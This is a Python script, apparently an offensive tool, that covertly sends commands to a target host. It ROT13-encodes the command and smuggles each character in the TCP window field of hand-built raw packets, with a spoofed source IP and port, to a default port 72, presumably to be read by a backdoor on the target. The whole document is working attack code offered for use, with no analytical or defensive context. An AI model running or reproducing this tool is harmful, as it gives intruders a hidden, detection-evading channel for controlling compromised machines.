import struct
import array
import socket
import time
import random
import argparse
from colorama import Fore

Reset = Fore.RESET
Red = Fore.RED
Green = Fore.GREEN
Cyan = Fore.CYAN

def ascii_art():
    art = """
                     .  WCE
                    / V\\
                  / `  /
                 <<   |
                 /    |
               /      |
             /        |
           /    \\  \\ /
          (      ) | |
  ________|   _/_  | |
<__________\\______)\\__)\\n
- Created by Momen Eldawakhly (Cyber Guy)
-- Samurai Digital Security
    """
    print(art)

argParser = argparse.ArgumentParser()
argParser.add_argument("-c", "--command", help="Command to execute")
argParser.add_argument("-t", "--target", help="Target IP")
argParser.add_argument("-dp", "--dst-port", help="Destination port", type=int, default=72)
argParser.add_argument("-d", "--delay", help="Seconds to delay between packets, the more seconds, the more stable connection.")
argParser.add_argument("-s", "--source", help="Source IP")
argParser.add_argument("-p", "--port", help="Source port", type=int)
args = argParser.parse_args()
command = args.command
target = args.target
dst_port = args.dst_port
delay = args.delay
src_ip = args.source
src_port = args.port

class TCPPacket:
    def __init__(self, src_host, src_port, dst_host, dst_port, window, flags=0):
        self.src_host = src_host
        self.src_port = src_port
        self.dst_host = dst_host
        self.dst_port = dst_port
        self.window = window
        self.flags = flags

    def build(self):
        packet = struct.pack('!HHIIHHHH', self.src_port, self.dst_port,
                             random.randint(0, 2**32 - 1), random.randint(0, 2**32 - 1),
                             5 << 12 | 0b110000, self.window, 0, 0)

        pseudo_hdr = struct.pack('!4s4sHH', socket.inet_aton(self.src_host),
                                 socket.inet_aton(self.dst_host), socket.IPPROTO_TCP, len(packet))

        def chksum(packet):
            if len(packet) % 2 != 0:
                packet += b'\0'
            res = sum(array.array("H", packet))
            res = (res >> 16) + (res & 0xffff)
            res += res >> 16
            return (~res) & 0xffff

        checksum = chksum(pseudo_hdr + packet)
        packet = packet[:16] + struct.pack('H', checksum) + packet[18:]
        return packet

if not command or not delay or not src_ip or not src_port:
    ascii_art()
    if not command: print(f"{Red}[-] Please specify IP to command. {Reset}")
    if not delay: print(f"{Red}[-] Please specify time to delay. {Reset}")
    if not src_ip: print(f"{Red}[-] Please specify source IP. {Reset}")
    if not src_port: print(f"{Red}[-] Please specify source port. {Reset}")
else:
    ascii_art()
    print(f"{Green}[+] Target: {Cyan + target + Reset}")
    print(f"{Green}[+] Command: {Cyan + command + Reset}")
    print(f"{Green}[+] Time to delay: {Cyan + delay + Reset}\n\n")

    encoded_command = command.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                                                       'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))
    print(Green + f"[+] Unpacking {Cyan + command + Green} to be sent. {Reset}")
    print(Green + f"[+] Sending {Cyan + command + Reset + Green} with { Cyan + delay + Reset + Green} seconds to delay. {Reset}")

    for char in encoded_command:
        char_val = ord(char)
        pak = TCPPacket(src_ip, src_port, target, dst_port, char_val)
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.sendto(pak.build(), (target, 0))
        time.sleep(int(delay))
        print(Green + f"[+] Command {Cyan + command + Reset + Green} sent. {Reset}")
